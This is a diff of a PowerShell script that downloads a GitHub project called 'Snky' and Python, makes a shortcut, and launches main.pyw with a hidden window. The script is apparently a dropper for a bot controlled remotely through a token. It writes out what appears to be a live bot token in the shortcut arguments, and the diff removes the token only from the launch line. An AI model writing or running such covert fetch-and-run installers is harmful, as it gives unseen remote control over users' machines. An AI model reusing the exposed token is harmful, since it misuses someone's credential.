@@ -1,6 +1,7 @@
 $projectUrl = "https://github.com/richa-z/Snky/archive/refs/heads/main.zip"
 $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
 $pythonInstaller = "$($env:TEMP)\python.exe"
+$token = ""
 
 #PYTHON INSTALLER
 Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller
@@ -20,7 +21,7 @@ $Shortcut.TargetPath = "c:\System32\cmd.exe"
 $Shortcut.Arguments = "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw MTE2OTU4MDgwOTQxNDUyOTA2NQ.G6bQfc.cT0wAuwHSa-M2oV0jfKXLwcbx_thL0xlaF7MN8"
 $Shortcut.Save()
 
-Start-Process "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw" MTE2OTU4MDgwOTQxNDUyOTA2NQ.G6bQfc.cT0wAuwHSa-M2oV0jfKXLwcbx_thL0xlaF7MN8 -Wait -WindowStyle Hidden
+Start-Process "$($env:LOCALAPPDATA)\Snky\Snky-main\main.pyw" $token -Wait -WindowStyle Hidden
 
 
 
